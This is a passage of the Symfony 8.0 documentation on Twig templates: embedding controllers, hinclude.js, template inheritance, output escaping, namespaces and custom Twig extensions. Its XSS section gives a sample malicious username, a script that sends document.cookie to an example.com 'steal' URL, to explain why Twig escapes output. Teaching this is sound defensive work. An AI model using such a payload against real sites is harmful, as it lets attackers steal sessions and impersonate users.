{# templates/blog/index.html.twig #}

{# ... #}
{{ include('blog/_user_profile.html.twig', {user: blog_post.author}) }}
```

### [Embedding Controllers](https://symfony.com/doc/8.0/templates.html#embedding-controllers "Permalink to this headline")

[Including template fragments](https://symfony.com/doc/8.0/templates.html#templates-include) is useful to reuse the same content on several pages. However, this technique is not the best solution in some cases.

Imagine that the template fragment displays the three most recent blog articles. To do that, it needs to make a database query to get those articles. When using the `include()` function, you'd need to do the same database query in every page that includes the fragment. This is not very convenient.

A better alternative is to **embed the result of executing some controller** with the `render()` and `controller()` Twig functions.

First, create the controller that renders a certain number of recent articles:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18

```
// src/Controller/BlogController.php
namespace App\Controller;

use Symfony\Component\HttpFoundation\Response;
// ...

class BlogController extends AbstractController
{
    public function recentArticles(int $max = 3): Response
    {
        // get the recent articles somehow (e.g. making a database query)
        $articles = ['...', '...', '...'];

        return $this->render('blog/_recent_articles.html.twig', [
            'articles' => $articles
        ]);
    }
}
```

Then, create the `blog/_recent_articles.html.twig` template fragment (the `_` prefix in the template name is optional, but it's a convention used to better differentiate between full templates and template fragments):

1
2
3
4
5
6

```
{# templates/blog/_recent_articles.html.twig #}
{% for article in articles %}
    <a href="{{ path('blog_show', {slug: article.slug}) }}">
        {{ article.title }}
    </a>
{% endfor %}
```

Now you can call to this controller from any template to embed its result:

1
2
3
4
5
6
7
8
9
10
11
12
13
14

```
{# templates/base.html.twig #}

{# ... #}
<div id="sidebar">
    {# if the controller is associated with a route, use the path() or url() functions #}
    {{ render(path('latest_articles', {max: 3})) }}
    {{ render(url('latest_articles', {max: 3})) }}

    {# if you don't want to expose the controller with a public URL,
       use the controller() function to define the controller to execute #}
    {{ render(controller(
        'App\\Controller\\BlogController::recentArticles', {max: 3}
    )) }}
</div>
```

When using the `controller()` function, controllers are not accessed using a regular Symfony route but through a special URL used exclusively to serve those template fragments. Configure that special URL in the `fragments` option:

YAML PHP

1
2
3
4

```
# config/packages/framework.yaml
framework:
    # ...
    fragments: { path: /_fragment }
```

1
2
3
4
5
6
7
8
9
10
11

```
// config/packages/framework.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'framework' => [
        // ...
        'fragments' => [
            'path' => '/_fragment',
        ],
    ],
]);
```

Warning

Embedding controllers requires making requests to those controllers and rendering some templates as result. This can have a significant impact on the application performance if you embed lots of controllers. If possible, [cache the template fragment](https://symfony.com/doc/8.0/http_cache/esi.html).

[How to Embed Asynchronous Content with hinclude.js](https://symfony.com/doc/8.0/templates.html#how-to-embed-asynchronous-content-with-hinclude-js "Permalink to this headline")
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Templates can also embed contents asynchronously with the `hinclude.js` JavaScript library.

First, include the [hinclude.js](https://mnot.github.io/hinclude/) library in your page [linking to it](https://symfony.com/doc/8.0/templates.html#templates-link-to-assets) from the template or adding it to your application JavaScript [using AssetMapper](https://symfony.com/doc/8.0/frontend.html).

As the embedded content comes from another page (or controller for that matter), Symfony uses a version of the standard `render()` function to configure `hinclude` tags in templates:

1
2

```
{{ render_hinclude(controller('...')) }}
{{ render_hinclude(url('...')) }}
```

Note

When using the `controller()` function, you must also configure the [fragments path option](https://symfony.com/doc/8.0/templates.html#fragments-path-config).

When JavaScript is disabled or it takes a long time to load you can display a default content rendering some template:

YAML PHP

1
2
3
4
5

```
# config/packages/framework.yaml
framework:
    # ...
    fragments:
        hinclude_default_template: hinclude.html.twig
```

1
2
3
4
5
6
7
8
9
10
11

```
// config/packages/framework.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'framework' => [
        // ...
        'fragments' => [
            'hinclude_default_template' => 'hinclude.html.twig',
        ],
    ],
]);
```

You can define default templates per `render()` function (which will override any global default template that is defined):

1
2
3

```
{{ render_hinclude(controller('...'),  {
    default: 'default/content.html.twig'
}) }}
```

Or you can also specify a string to display as the default content:

1`{{ render_hinclude(controller('...'), {default: 'Loading...'}) }}`

Use the `attributes` option to define the value of hinclude.js options:

1
2
3
4
5
6
7

```
{# by default, cross-site requests don't use credentials such as cookies, authorization
   headers or TLS client certificates; set this option to 'true' to use them #}
{{ render_hinclude(controller('...'), {attributes: {'data-with-credentials': 'true'}}) }}

{# by default, the JavaScript code included in the loaded contents is not run;
   set this option to 'true' to run that JavaScript code #}
{{ render_hinclude(controller('...'), {attributes: {evaljs: 'true'}}) }}
```

### [Template Inheritance and Layouts](https://symfony.com/doc/8.0/templates.html#template-inheritance-and-layouts "Permalink to this headline")

As your application grows you'll find more and more repeated elements between pages, such as headers, footers, sidebars, etc. [Including templates](https://symfony.com/doc/8.0/templates.html#templates-include) and [embedding controllers](https://symfony.com/doc/8.0/templates.html#templates-embed-controllers) can help, but when pages share a common structure, it's better to use **inheritance**.

The concept of [Twig template inheritance](https://twig.symfony.com/doc/3.x/tags/extends.html) is similar to PHP class inheritance. You define a parent template that other templates can extend from and child templates can override parts of the parent template.

Symfony recommends the following three-level template inheritance for medium and complex applications:

* `templates/base.html.twig`, defines the common elements of all application templates, such as `<head>`, `<header>`, `<footer>`, etc.;
* `templates/layout.html.twig`, extends from `base.html.twig` and defines the content structure used in all or most of the pages, such as a two-column content + sidebar layout. Some sections of the application can define their own layouts (e.g. `templates/blog/layout.html.twig`);
* `templates/*.html.twig`, the application pages which extend from the main `layout.html.twig` template or any other section layout.

In practice, the `base.html.twig` template would look like this:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27

```
{# templates/base.html.twig #}
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>{% block title %}My Application{% endblock %}</title>
        {% block stylesheets %}
            <link rel="stylesheet" type="text/css" href="/css/base.css">
        {% endblock %}
    </head>
    <body>
        {% block body %}
            <div id="sidebar">
                {% block sidebar %}
                    <ul>
                        <li><a href="{{ path('homepage') }}">Home</a></li>
                        <li><a href="{{ path('blog_index') }}">Blog</a></li>
                    </ul>
                {% endblock %}
            </div>

            <div id="content">
                {% block content %}{% endblock %}
            </div>
        {% endblock %}
    </body>
</html>
```

The [Twig block tag](https://twig.symfony.com/doc/3.x/tags/block.html) defines the page sections that can be overridden in the child templates. They can be empty, like the `content` block or define a default content, like the `title` block, which is displayed when child templates don't override them.

The `blog/layout.html.twig` template could be like this:

1
2
3
4
5
6
7
8

```
{# templates/blog/layout.html.twig #}
{% extends 'base.html.twig' %}

{% block content %}
    <h1>Blog</h1>

    {% block page_contents %}{% endblock %}
{% endblock %}
```

The template extends from `base.html.twig` and only defines the contents of the `content` block. The rest of the parent template blocks will display their default contents. However, they can be overridden by the third-level inheritance template, such as `blog/index.html.twig`, which displays the blog index:

1
2
3
4
5
6
7
8
9
10
11

```
{# templates/blog/index.html.twig #}
{% extends 'blog/layout.html.twig' %}

{% block title %}Blog Index{% endblock %}

{% block page_contents %}
    {% for article in articles %}
        <h2>{{ article.title }}</h2>
        <p>{{ article.body }}</p>
    {% endfor %}
{% endblock %}
```

This template extends from the second-level template (`blog/layout.html.twig`) but overrides blocks of different parent templates: `page_contents` from `blog/layout.html.twig` and `title` from `base.html.twig`.

When you render the `blog/index.html.twig` template, Symfony uses three different templates to create the final contents. This inheritance mechanism boosts your productivity because each template includes only its unique contents and leaves the repeated contents and HTML structure to some parent templates.

Warning

When using `extends`, a child template is forbidden to define template parts outside of a block. The following code throws a `SyntaxError`:

1
2
3
4
5
6
7
8

```
{# templates/blog/index.html.twig #}
{% extends 'base.html.twig' %}

{# the line below is not captured by a "block" tag #}
<div class="alert">Some Alert</div>

{# the following is valid #}
{% block content %}My cool blog posts{% endblock %}
```

Read the [Twig template inheritance](https://twig.symfony.com/doc/3.x/tags/extends.html) docs to learn more about how to reuse parent block contents when overriding templates and other advanced features.

[Output Escaping and XSS Attacks](https://symfony.com/doc/8.0/templates.html#output-escaping-and-xss-attacks "Permalink to this headline")
------------------------------------------------------------------------------------------------------------------------------------------

Imagine that your template includes the `Hello {{ name }}` code to display the user name and a malicious user sets the following as their name:

1
2
3
4

```
My Name
<script type="text/javascript">
    document.write('<img src="https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
</script>
```

You'll see `My Name` on screen but the attacker just secretly stole your cookies so they can impersonate you on other websites. This is known as a [Cross-Site Scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) or XSS attack.

To prevent this attack, use _"output escaping"_ to transform the characters which have special meaning (e.g. replace `<` by the `&lt;` HTML entity). Symfony applications are safe by default because they perform automatic output escaping:

1
2
3

```
<p>Hello {{ name }}</p>
{# if 'name' is '<script>alert('hello!')</script>', Twig will output this:
   '<p>Hello &lt;script&gt;alert(&#39;hello!&#39;)&lt;/script&gt;</p>' #}
```

If you are rendering a variable that is trusted and contains HTML contents, use the [Twig raw filter](https://twig.symfony.com/doc/3.x/filters/raw.html) to disable the output escaping for that variable:

1
2
3

```
<h1>{{ product.title|raw }}</h1>
{# if 'product.title' is 'Lorem <strong>Ipsum</strong>', Twig will output
   exactly that instead of 'Lorem &lt;strong&gt;Ipsum&lt;/strong&gt;' #}
```

Read the [Twig output escaping docs](https://twig.symfony.com/doc/3.x/api.html#escaper-extension) to learn more about how to disable output escaping for a block or even an entire template.

[Template Namespaces](https://symfony.com/doc/8.0/templates.html#template-namespaces "Permalink to this headline")
------------------------------------------------------------------------------------------------------------------

Although most applications store their templates in the default `templates/` directory, you may need to store some or all of them in different directories. Use the `twig.paths` option to configure those extra directories. Each path is defined as a `key: value` pair where the `key` is the template directory and the `value` is the Twig namespace, which is explained later:

YAML PHP

1
2
3
4
5
6
7
8

```
# config/packages/twig.yaml
twig:
    # ...
    paths:
        # directories are relative to the project root dir (but you
        # can also use absolute directories)
        'email/default/templates': ~
        'backend/templates': ~
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15

```
// config/packages/twig.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'twig' => [
        // ...

        // directories are relative to the project root dir (but you
        // can also use absolute directories)
        'paths' => [
            'email/default/templates' => null,
            'backend/templates' => null,
        ],
    ],
]);
```

When rendering a template, Symfony looks for it first in the `twig.paths` directories that don't define a namespace and then falls back to the default template directory (usually, `templates/`).

Using the above configuration, if your application renders for example the `layout.html.twig` template, Symfony will first look for `email/default/templates/layout.html.twig` and `backend/templates/layout.html.twig`. If any of those templates exists, Symfony will use it instead of using `templates/layout.html.twig`, which is probably the template you wanted to use.

Twig solves this problem with **namespaces**, which group several templates under a logic name unrelated to their actual location. Update the previous configuration to define a namespace for each template directory:

YAML PHP

1
2
3
4
5
6

```
# config/packages/twig.yaml
twig:
    # ...
    paths:
        'email/default/templates': 'email'
        'backend/templates': 'admin'
```

1
2
3
4
5
6
7
8
9
10
11
12

```
// config/packages/twig.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'twig' => [
        // ...
        'paths' => [
            'email/default/templates' => 'email',
            'backend/templates' => 'admin',
        ],
    ],
]);
```

Now, if you render the `layout.html.twig` template, Symfony will render the `templates/layout.html.twig` file. Use the special syntax `@` + namespace to refer to the other namespaced templates (e.g. `@email/layout.html.twig` and `@admin/layout.html.twig`).

Note

A single Twig namespace can be associated with more than one template directory. In that case, the order in which paths are added is important because Twig will start looking for templates from the first defined path.

### [Bundle Templates](https://symfony.com/doc/8.0/templates.html#bundle-templates "Permalink to this headline")

If you [install packages/bundles](https://symfony.com/doc/8.0/setup.html#symfony-flex) in your application, they may include their own Twig templates (in the `templates/` directory of each bundle). To avoid messing with your own templates, Symfony adds bundle templates under an automatic namespace created after the bundle name.

For example, the templates of a bundle called `AcmeBlogBundle` are available under the `AcmeBlog` namespace. If this bundle includes the template `<your-project>/vendor/acme/blog-bundle/templates/user/profile.html.twig`, you can refer to it as `@AcmeBlog/user/profile.html.twig`.

Tip

You can also [override bundle templates](https://symfony.com/doc/8.0/bundles/override.html#override-templates) in case you want to change some parts of the original bundle templates.

[Writing a Twig Extension](https://symfony.com/doc/8.0/templates.html#writing-a-twig-extension "Permalink to this headline")
----------------------------------------------------------------------------------------------------------------------------

[Twig Extensions](https://twig.symfony.com/doc/3.x/advanced.html#creating-an-extension) allow the creation of custom functions, filters, and more to use in your Twig templates. Before writing your own Twig extension, check if the filter/function that you need is not already implemented in:

* The [default Twig filters and functions](https://twig.symfony.com/doc/3.x/#reference);
* The [Twig filters and functions added by Symfony](https://symfony.com/doc/8.0/reference/twig_reference.html);
* The [official Twig extensions](https://github.com/twigphp?q=extra) related to strings, HTML, Markdown, internationalization, etc.

### [Create the Extension Class](https://symfony.com/doc/8.0/templates.html#create-the-extension-class "Permalink to this headline")

Suppose you want to create a new filter called `price` that formats a number as currency:

1
2
3
4

```
{{ product.price|price }}

{# pass in the 3 optional arguments #}
{{ product.price|price(2, ',', '.') }}
```

Create a regular PHP class with a method that contains the filter logic. Then, add the `#[AsTwigFilter]` attribute to define the name and options of the Twig filter:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16

```
// src/Twig/AppExtension.php
namespace App\Twig;

use Twig\Attribute\AsTwigFilter;

class AppExtension
{
    #[AsTwigFilter('price')]
    public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string
    {
        $price = number_format($number, $decimals, $decPoint, $thousandsSep);
        $price = '$'.$price;

        return $price;
    }
}
```

If you want to create a function instead of a filter, use the `#[AsTwigFunction]` attribute:

1
2
3
4
5
6
7
8
9
10
11
12
13

```
// src/Twig/AppExtension.php
namespace App\Twig;

use Twig\Attribute\AsTwigFunction;

class AppExtension
{
    #[AsTwigFunction('area')]
    public function calculateArea(int $width, int $length): int
    {
        return $width * $length;
    }
}
```

Tip

Along with custom filters and functions, you can also register [global variables](https://twig.symfony.com/doc/3.x/advanced.html#id1).

If you're using the [default services.yaml configuration](https://symfony.com/doc/8.0/service_container.html#service-container-services-load-example), the [service autoconfiguration](https://symfony.com/doc/8.0/service_container.html#services-autoconfigure) feature will enable this class as a Twig extension. Otherwise, you need to define a service manually and [tag it](https://symfony.com/doc/8.0/service_container/tags.html) with the `twig.attribute_extension` tag.

#### [Register an Extension as a Service](https://symfony.com/doc/8.0/templates.html#register-an-extension-as-a-service "Permalink to this headline")

Next, register your class as a service and tag it with `twig.extension`. If you're using the [default services.yaml configuration](https://symfony.com/doc/8.0/service_container.html#service-container-services-load-example), you're done! Symfony will automatically know about your new service and add the tag.

You can now start using your filter in any Twig template. Optionally, execute this command to confirm that your new filter was successfully registered:

1
2
3
4
5

```
# display all information about Twig
$ php bin/console debug:twig

# display only the information about a specific filter
$ php bin/console debug:twig --filter=price
```

### [Creating Lazy-Loaded Twig Extensions](https://symfony.com/doc/8.0/templates.html#creating-lazy-loaded-twig-extensions "Permalink to this headline")

When [using attributes to extend Twig](https://symfony.com/doc/8.0/templates.html#templates-twig-filter-attribute), the **Twig extensions are already lazy-loaded** and you don't have to do anything else. However, if your Twig extensions follow the **legacy approach** of extending the `AbstractExtension` class, Twig initializes all the extensions before rendering any template, even if they are not used.

If extensions don't define dependencies (i.e. if you don't inject services in them) performance is not affected. However, if extensions define lots of complex dependencies (e.g. those making database connections), the performance loss can be significant.

That's why Twig allows decoupling the extension definition from its implementation. Following the same example as before, the first change would be to remove the `formatPrice()` method from the extension and update the PHP callable defined in `getFilters()`:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17

```
// src/Twig/AppExtension.php
namespace App\Twig;

use App\Twig\AppRuntime;
use Twig\Extension\AbstractExtension;
use Twig\TwigFilter;

class AppExtension extends AbstractExtension
{
    public function getFilters(): array
    {
        return [
            // the logic of this filter is now implemented in a different class
            new TwigFilter('price', [AppRuntime::class, 'formatPrice']),
        ];
    }
}
```

Then, create the new `AppRuntime` class (it's not required but these classes are suffixed with `Runtime` by convention) and include the logic of the previous `formatPrice()` method:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21

```
// src/Twig/AppRuntime.php
namespace App\Twig;

use Twig\Extension\RuntimeExtensionInterface;

class AppRuntime implements RuntimeExtensionInterface
{
    public function __construct()
    {
        // this simple example doesn't define any dependency, but in your own
        // extensions, you'll need to inject services using this constructor
    }

    public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string
    {
        $price = number_format($number, $decimals, $decPoint, $thousandsSep);
        $price = '$'.$price;

        return $price;
    }
}
```

If you're using the default `services.yaml` configuration, this will already work! Otherwise, [create a service](https://symfony.com/doc/8.0/service_container.html#service-container-creating-service) for this class and [tag your service](https://symfony.com/doc/8.0/service_container/tags.html) with `twig.runtime`.

 This work, including the code samples, is licensed under a [Creative Commons BY-SA 3.0](https://creativecommons.org/licenses/by-sa/3.0/) license.

 TOC

 Search

 Version

**Symfony 8.0**[backers](https://symfony.com/backers)

[](https://sulu.io/)

[](https://jb.gg/fbsk8y)

[![Image 1: Measure & Improve Symfony Code Performance](https://symfony.com/images/network/blackfire_01.png)](https://www.blackfire.io/profiler?utm_source=symfony&utm_medium=ad_white_logo&utm_campaign=profiler)
[Measure & Improve Symfony Code Performance](https://www.blackfire.io/profiler?utm_source=symfony&utm_medium=ad_white_logo&utm_campaign=profiler)

[![Image 2: Save your teams and projects before they sink](https://symfony.com/images/network/sfinsight_02.png)](https://insight.symfony.com/?utm_source=ad&utm_medium=banner&utm_campaign=insight&utm_content=sink)
[Save your teams and projects before they sink](https://insight.symfony.com/?utm_source=ad&utm_medium=banner&utm_campaign=insight&utm_content=sink)

Symfony footer
--------------

![Image 3: Avatar of Alfonso M. García Astorga, a Symfony contributor](https://connect.symfony.com/api/images/39081003-0c26-42f5-a9f0-0fbc5abf86cf.png?format=48x48)

Thanks **[Alfonso M. García Astorga](https://connect.symfony.com/profile/alfonsomga)** (**@alfonsomga**) for being a Symfony contributor

[**2** commits](https://github.com/symfony/symfony/commits?author=alfonsomga) • **64** lines changed

[View all contributors](https://symfony.com/contributors) that help us make Symfony

### Become a Symfony contributor

Be an active part of the community and contribute ideas, code and bug fixes. Both experts and newcomers are welcome.

[Learn how to contribute](https://symfony.com/doc/current/contributing/index.html)

![Image 4](https://symfony.com/assets/icons/logos/sf-20years-wordmark-dark--dFsFxh.webp)
[Celebrating 20 years of Symfony](https://symfony.com/20years)

**Symfony**™ is a trademark of Symfony SAS. [All rights reserved](https://symfony.com/trademark).

* [What is Symfony?](https://symfony.com/what-is-symfony)

  * [What is Symfony?](https://symfony.com/what-is-symfony)
  * [Symfony at a Glance](https://symfony.com/at-a-glance)
  * [Symfony Packages](https://symfony.com/packages)
  * [Symfony Releases](https://symfony.com/releases)
  * [Security Policy](https://symfony.com/doc/current/contributing/code/security.html)
  * [Logo & Screenshots](https://symfony.com/logo)
  * [Trademark & Licenses](https://symfony.com/license)
  * [symfony1 Legacy](https://symfony.com/legacy)

* [Learn Symfony](https://symfony.com/doc)

  * [Symfony Docs](https://symfony.com/doc)
  * [Symfony Book](https://symfony.com/book)
  * [Reference](https://symfony.com/doc/current/reference/index.html)
  * [Bundles](https://symfony.com/bundles)
  * [Best Practices](https://symfony.com/doc/current/best_practices.html)
  * [Training](https://sensiolabs.com/training/courses?utm_source=symfony&utm_medium=symfony_footer&utm_campaign=permanent_referral)
  * [eLearning Platform](https://university.sensiolabs.com/e-learning-platform?utm_source=symfony&utm_medium=symfony_footer&utm_campaign=permanent_referral)
  * [Certification](https://certification.symfony.com/)

* [Screencasts](https://symfonycasts.com/)

  * [Learn Symfony](https://symfonycasts.com/tracks/symfony)
  * [Learn PHP](https://symfonycasts.com/tracks/php)
  * [Learn JavaScript](https://symfonycasts.com/tracks/javascript)
  * [Learn Drupal](https://symfonycasts.com/tracks/drupal)
  * [Learn RESTful APIs](https://symfonycasts.com/tracks/rest)

* [Community](https://symfony.com/community)

  * [Symfony Community](https://symfony.com/community)
  * [SymfonyConnect](https://connect.symfony.com/)
  * [Events & Meetups](https://symfony.com/events/)
  * [Projects using Symfony](https://symfony.com/projects)
  * [Contributors](https://symfony.com/contributors)
  * [Symfony Jobs](https://symfony.com/jobs)
  * [Backers](https://symfony.com/backers)
  * [Code of Conduct](https://symfony.com/doc/current/contributing/code_of_conduct/code_of_conduct.html)
  * [Downloads Stats](https://symfony.com/stats/downloads)
  * [Support](https://symfony.com/support)

* [Blog](https://symfony.com/blog/)

  * [All Blog Posts](https://symfony.com/blog/)
  * [A Week of Symfony](https://symfony.com/blog/category/a-week-of-symfony)
  * [Case Studies](https://symfony.com/blog/category/case-studies)
  * [Cloud](https://symfony.com/blog/category/cloud)
  * [Community](https://symfony.com/blog/category/community)
  * [Conferences](https://symfony.com/blog/category/conferences)
  * [Diversity](https://symfony.com/blog/category/diversity)
  * [Living on the edge](https://symfony.com/blog/category/living-on-the-edge)
  * [Releases](https://symfony.com/blog/category/releases)
  * [Security Advisories](https://symfony.com/blog/category/security-advisories)
  * [Symfony Insight](https://symfony.com/blog/category/symfony-insight)
  * [Twig](https://symfony.com/blog/category/twig)
  * [SensioLabs Blog](https://sensiolabs.com/blog?utm_source=symfony&utm_medium=symfony_footer&utm_campaign=permanent_referral)

* [Services](https://sensiolabs.com/?utm_source=symfony&utm_medium=symfony_footer&utm_campaign=permanent_referral)

  * [SensioLabs services](https://sensiolabs.com/?utm_source=symfony&utm_medium=symfony_footer&utm_campaign=permanent_referral)
  * [Train developers](https://sensiolabs.com/training?utm_source=symfony&utm_medium=symfony_footer&utm_campaign=permanent_referral)
  * [Manage your project quality](https://insight.symfony.com/)
  * [Improve your project performance](https://www.blackfire.io/?utm_source=symfony&utm_medium=symfonycom_footer&utm_campaign=profiler)
  * [Host Symfony projects](https://symfony.com/cloud/)

[Powered by](https://symfony.com/cloud/)

[](https://symfony.com/cloud/ "Upsun, a Platform-as-a-Service optimized for Symfony developers")

### Follow Symfony

[](https://github.com/symfony "Symfony on GitHub")[](https://symfony.com/slack "Symfony on Slack")[](https://twitter.com/symfony "Symfony on Twitter")[](https://mastodon.social/@symfony "Symfony on Mastodon")[](https://www.linkedin.com/company/symfony-sas/ "Symfony on LinkedIn")[](https://www.facebook.com/SymfonyFramework "Symfony on Facebook")[](https://www.youtube.com/symfonytv "Symfony on YouTube")[](https://bsky.app/profile/symfony.com "Symfony on BlueSky")[](https://www.threads.net/@symfony "Symfony on Threads")[](https://symfonycasts.com/ "Symfony Screencasts")[](https://feeds.feedburner.com/symfony/blog "Symfony Blog RSS")

Site appearance:

CLOSE

Search Symfony Docs

Search
